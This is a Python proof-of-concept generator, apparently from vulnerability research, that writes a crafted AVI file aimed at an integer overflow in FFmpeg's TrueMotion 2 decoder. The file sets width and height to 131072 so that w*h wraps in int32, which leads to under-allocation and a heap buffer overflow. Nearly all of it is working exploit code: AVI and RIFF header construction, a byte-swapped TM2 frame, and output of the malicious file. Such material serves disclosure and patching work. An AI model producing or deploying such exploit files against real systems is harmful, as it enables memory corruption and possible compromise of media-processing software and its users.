#!/usr/bin/env python3
"""
PoC generator for VULN 001: Integer Overflow in TrueMotion 2 decode_init()
CVE candidate: integer overflow in w*h leads to under-allocation (CWE-190 -> CWE-122)

Root cause (truemotion2.c lines 972-979):
    int w = avctx->width, h = avctx->height;  // int (32-bit signed)
    ...
    w += 8;   // w = 131080 for width=131072
    h += 8;   // h = 131080
    l->Y_base = av_calloc(w * h, 2 * sizeof(*l->Y_base));
    // w * h overflows int32: 131080^2 = 0x400200040 -> truncates to 0x00200040 = 2,097,216
    // Only ~16 MB allocated instead of ~128 GB
    l->Y2 = l->Y1 + w * h;   // same overflowed w*h used for pointer arithmetic
    // tm2_decode_blocks() then writes far past the buffer

Attack: crafted AVI with TM20 video track, width=height=131072
"""

import struct
import sys
import os

# Target dimensions to trigger the integer overflow
WIDTH  = 131072   # causes (WIDTH+8)^2 to overflow int32
HEIGHT = 131072

# TM2 magic in bswap-adjusted file bytes
# FFmpeg bswaps the frame buffer (reverses each 4-byte word before processing).
# Desired bswapped buffer[0..3] via AV_RL32 = 0x00000100 (TM2_OLD_HEADER_MAGIC):
#   little-endian bytes: [0x00, 0x01, 0x00, 0x00]
# Since bswap reverses each word, file[0..3] = reverse([0x00,0x01,0x00,0x00]) = [0x00,0x00,0x01,0x00]
TM2_MAGIC_FILE_BYTES = bytes([0x00, 0x00, 0x01, 0x00])


def pack_le32(v):
    return struct.pack('<I', v & 0xFFFFFFFF)

def pack_le16(v):
    return struct.pack('<H', v & 0xFFFF)

def pack_le32s(v):
    return struct.pack('<i', v)


def riff_chunk(tag, data):
    """Create a RIFF chunk: tag(4) + size(4) + data."""
    if isinstance(tag, str):
        tag = tag.encode('ascii')
    data = bytes(data)
    return tag[:4] + pack_le32(len(data)) + data


def list_chunk(list_type, data):
    """Create a RIFF LIST chunk."""
    if isinstance(list_type, str):
        list_type = list_type.encode('ascii')
    data = bytes(data)
    return riff_chunk(b'LIST', list_type[:4] + data)


def make_avih(width, height):
    """AVIMAINHEADER - 56 bytes."""
    return (
        pack_le32(33333)    # dwMicroSecPerFrame (~30fps)
      + pack_le32(0)        # dwMaxBytesPerSec
      + pack_le32(0)        # dwPaddingGranularity
      + pack_le32(0)        # dwFlags
      + pack_le32(1)        # dwTotalFrames
      + pack_le32(0)        # dwInitialFrames
      + pack_le32(1)        # dwStreams
      + pack_le32(0)        # dwSuggestedBufferSize
      + pack_le32(width)    # dwWidth
      + pack_le32(height)   # dwHeight
      + pack_le32(0)        # dwReserved[0]
      + pack_le32(0)        # dwReserved[1]
      + pack_le32(0)        # dwReserved[2]
      + pack_le32(0)        # dwReserved[3]
    )


def make_strh(width, height):
    """AVISTREAMHEADER - 56 bytes.
    rcFrame is a RECT (4 x LONG = 16 bytes).
    """
    return (
        b'vids'             # fccType
      + b'TM20'             # fccHandler
      + pack_le32(0)        # dwFlags
      + pack_le16(0)        # wPriority
      + pack_le16(0)        # wLanguage
      + pack_le32(0)        # dwInitialFrames
      + pack_le32(1)        # dwScale
      + pack_le32(30)       # dwRate (30fps)
      + pack_le32(0)        # dwStart
      + pack_le32(1)        # dwLength
      + pack_le32(0)        # dwSuggestedBufferSize
      + pack_le32s(-1)      # dwQuality
      + pack_le32(0)        # dwSampleSize
      # rcFrame: left, top, right, bottom (each LONG = 4 bytes)
      + pack_le32(0)        # left
      + pack_le32(0)        # top
      + pack_le32(width)    # right
      + pack_le32(height)   # bottom
    )


def make_strf(width, height):
    """BITMAPINFOHEADER - 40 bytes."""
    return (
        pack_le32(40)       # biSize
      + pack_le32(width)    # biWidth
      + pack_le32s(height)  # biHeight (positive = bottom-up)
      + pack_le16(1)        # biPlanes
      + pack_le16(24)       # biBitCount
      + b'TM20'             # biCompression (FOURCC in file = b'TM20' in little-endian)
      + pack_le32(0)        # biSizeImage
      + pack_le32(0)        # biXPelsPerMeter
      + pack_le32(0)        # biYPelsPerMeter
      + pack_le32(0)        # biClrUsed
      + pack_le32(0)        # biClrImportant
    )


def make_tm2_frame():
    """
    Construct a minimal TM2 frame payload (the raw bytes stored in the 00dc chunk).

    FFmpeg bswap_buf-s the frame before processing (reverses each 4-byte word).
    We need to store the file bytes as the REVERSAL of what we want after bswap.

    Frame layout (in the bswapped buffer as FFmpeg sees it):
      [0..3]   TM2_OLD_HEADER_MAGIC = 0x00000100 (read via AV_RL32, so little-endian bytes:
                  [0x00, 0x01, 0x00, 0x00])
      [4..39]  Header padding (36 bytes, zeros)
      [40..43] Stream 0 (C_HI): len_dwords = 0 -> empty stream (4 bytes)
      [44..47] Stream 1 (C_LO): len_dwords = 0
      [48..51] Stream 2 (L_HI): len_dwords = 0
      [52..55] Stream 3 (L_LO): len_dwords = 0
      [56..59] Stream 4 (UPD):  len_dwords = 0
      [60..63] Stream 5 (MOT):  len_dwords = 0
      [64..67] Stream 6 (TYPE): len_dwords = 0
    Total: 68 bytes in bswapped buffer.

    File bytes = per-word reversal of the above:
    - Words at offsets 0, 4, 8, ... 64 are reversed.
    - All-zero words stay zero; only the magic word changes.

    Bswapped[0..3] wanted: [0x00, 0x01, 0x00, 0x00]
    -> File[0..3] = [0x00, 0x00, 0x01, 0x00]  (reversed)
    """
    # Build a 68-byte buffer representing what FFmpeg will see after bswap.
    bswapped = bytearray(68)

    # TM2_OLD_HEADER_MAGIC = 0x00000100 via AV_RL32 means bytes [0x00, 0x01, 0x00, 0x00]
    bswapped[0] = 0x00
    bswapped[1] = 0x01
    bswapped[2] = 0x00
    bswapped[3] = 0x00
    # Remaining bytes: all zero (empty header + 7 zero-length streams)

    # Convert from "desired bswapped" to file bytes:
    # Each 4-byte word is reversed in the file compared to bswapped buffer.
    file_bytes = bytearray(68)
    for i in range(0, 68, 4):
        file_bytes[i+0] = bswapped[i+3]
        file_bytes[i+1] = bswapped[i+2]
        file_bytes[i+2] = bswapped[i+1]
        file_bytes[i+3] = bswapped[i+0]

    return bytes(file_bytes)


def make_avi(width, height, frame_data):
    """Assemble a complete minimal AVI file."""
    avih_data = make_avih(width, height)
    strh_data = make_strh(width, height)
    strf_data = make_strf(width, height)

    # strl LIST: strh + strf chunks
    strl_content = (
        riff_chunk(b'strh', strh_data)
      + riff_chunk(b'strf', strf_data)
    )
    strl_list = list_chunk(b'strl', strl_content)

    # hdrl LIST: avih + strl
    hdrl_content = riff_chunk(b'avih', avih_data) + strl_list
    hdrl_list = list_chunk(b'hdrl', hdrl_content)

    # movi LIST: one video frame
    frame_chunk = riff_chunk(b'00dc', frame_data)
    movi_list = list_chunk(b'movi', frame_chunk)

    # idx1 chunk: index entry for the one frame
    # AVIINDEXENTRY: ckid(4), dwFlags(4), dwChunkOffset(4), dwChunkSize(4)
    frame_offset = 4  # offset relative to movi data (after 'movi' tag = 4 bytes)
    idx_entry = (
        b'00dc'
      + pack_le32(0x10)         # AVIIF_KEYFRAME
      + pack_le32(frame_offset) # offset from movi start
      + pack_le32(len(frame_data))
    )
    idx_chunk = riff_chunk(b'idx1', idx_entry)

    # AVI RIFF body
    avi_body = hdrl_list + movi_list + idx_chunk

    # Outer RIFF header
    riff_data = b'AVI ' + avi_body
    riff_header = b'RIFF' + pack_le32(len(riff_data)) + riff_data

    return riff_header


def main():
    output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                               'vuln_001_input.avi')

    print(f"[*] Generating crafted AVI: {output_path}")
    print(f"[*] Width={WIDTH}, Height={HEIGHT}")
    print(f"[*] Integer overflow check:")
    w_eff = WIDTH  + 8
    h_eff = HEIGHT + 8
    product_real = w_eff * h_eff
    product_int32 = (product_real) & 0xFFFFFFFF
    if product_int32 >= 0x80000000:
        product_int32 -= 0x100000000  # signed interpretation
    print(f"    w+8={w_eff}, h+8={h_eff}")
    print(f"    True product:      {product_real:,} bytes x 8 = {product_real*8//1024//1024//1024:.1f} GB")
    print(f"    int32 product:     {product_int32:,} (overflowed)")
    print(f"    Allocated size:    {abs(product_int32)*8//1024//1024} MB (should be ~{product_real*8//1024//1024//1024} GB)")
    print(f"    Overflow occurs?   {product_real > 2**31 - 1}")

    frame_data = make_tm2_frame()
    print(f"[*] TM2 frame payload size: {len(frame_data)} bytes")

    avi_bytes = make_avi(WIDTH, HEIGHT, frame_data)
    print(f"[*] AVI file size: {len(avi_bytes)} bytes")

    with open(output_path, 'wb') as f:
        f.write(avi_bytes)

    print(f"[+] Written: {output_path}")
    return 0


if __name__ == '__main__':
    sys.exit(main())
